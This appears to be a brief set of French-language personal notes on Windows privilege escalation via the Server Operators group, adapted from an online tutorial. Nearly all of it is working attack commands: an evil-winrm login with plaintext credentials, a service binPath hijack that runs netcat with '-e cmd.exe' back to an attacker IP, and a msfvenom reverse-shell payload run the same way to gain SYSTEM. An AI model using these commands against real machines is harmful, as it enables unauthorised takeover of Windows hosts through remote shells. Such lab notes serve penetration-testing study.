ref : https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/



```
evil-winrm -I 192.168.1.16 -u aarti -p Ignite@987
net user aarti
```
```
# commande service pour repérer le Service wvtoolsd.exe
Ps C:/> services
```
la sortie devrait avoir
```
C:\program Files\WMware\WMware Tools\wmtoolsd.exe      True WMTools
```
### Méthode 1 : 
```
upload /usr/share/windows-binaries/nc.exe
sc.exe config VMTools binPath="C:\Users\aarti\Documents\nc.exe -e cmd.exe 192.168.1.205 1234"
```

ouvrir un netcat sur notre kali 
```
nc -lvp 1234
```
```
# Sur la machine cible 
sc.exe stop VMTools
sc.exe start VMTools
```


### Methode 2 : 
```
msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.1.205 lport=8888 -f exe > shell.exe
```

```
upload /root/shell.exe
sc.exe config VMTools binPath="C:\Users\aarti\Documents\shell.exe"
sc.exe stop VMTools
sc.exe start VMTools

```
